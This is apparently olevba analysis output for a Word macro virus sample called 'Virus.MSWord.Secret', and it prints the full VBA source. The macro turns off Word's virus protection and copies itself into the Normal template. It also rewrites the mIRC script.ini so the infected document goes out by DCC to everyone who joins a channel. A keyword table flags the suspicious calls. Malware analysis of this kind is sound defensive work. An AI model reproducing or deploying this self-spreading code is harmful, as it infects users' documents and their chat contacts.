olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Secret
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Secret - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSWord.Secret - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
atribute(VBE) = "secret"
Sub FileOpen()
' Secret Script/Word Virus By Sinixstar - Metaphase VX
' Special  thanks to Reptile/29a for the idea around that lil word virii patch
' Thanks to Knowdeth for all the help he's givin me.
' Also thanks to everyone  else whos helped, you know who you are.
Application.VBE.ActiveVBProject.VBComponents("secret").Export "c:\windows\secret.sys"
On Error Resume Next
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
If ToolsWordCount.Count <= 500 Then
    For A = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(A).Name = "secret" Then NormInstall = True
            Next A
    For A = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(A).Name = "secret" Then ActivInstall = True
            Next A
        If ActivInstall = True And NormInstall = False Then Set Secj = NormalTemplate.VBProject _
            Else If ActivInstall = False And NormInstall = True Then Set Secj = ActiveDocument.VBProject
End If
SHELL "COPY secret.doc C:\Windows\"
SetAttr "C:\Windows\secret.doc", vbReadOnly
SetAttr "C:\windows\secret.sys", vbReadOnly
SetAttr "C:\mirc\system\script.ini", vbReadOnly
Open "C:\mirc\system\script.ini" For Output As #1
PRINT #1 "[script]"
PRINT #1 "n0=on 1:text:   *:?:{ s *2 | halt }"
PRINT #1 "n1=alias /s / *1"
PRINT #1 "n2=on 1:connect:/.enable #d"
PRINT #1 "n3=#d off"
PRINT #1 "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick "c:\windows\secret.doc" } | .disable #d | .timer 1 60 .enable #d }"
PRINT #1 "n5=#d end"
Close #1
Secj.VBComponents.Import ("c:\windows\secret.sys")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
End

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|PRINT #             |May write to a file (if combined with Open)  |
|Suspicious|SHELL               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

